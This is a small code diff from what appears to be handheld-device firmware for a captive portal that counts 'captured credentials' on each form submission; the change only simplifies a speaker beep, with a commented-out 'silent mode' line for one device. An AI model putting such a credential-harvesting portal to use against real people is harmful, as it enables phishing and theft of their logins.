@@ -294,9 +294,7 @@ void setupWebServer() {
     totalCapturedCredentials = totalCapturedCredentials + 1;
     webServer.send(HTTP_CODE, "text/html", index_POST());
 #if defined(STICK_C_PLUS)
-    SPEAKER.tone(4000);
-    delay(50);
-    SPEAKER.mute();
+    SPEAKER.tone(4000, 50);
 #elif defined(CARDPUTER)
     //SPEAKER.tone(4000, 50);     //Silent mode, just in case
 #endif
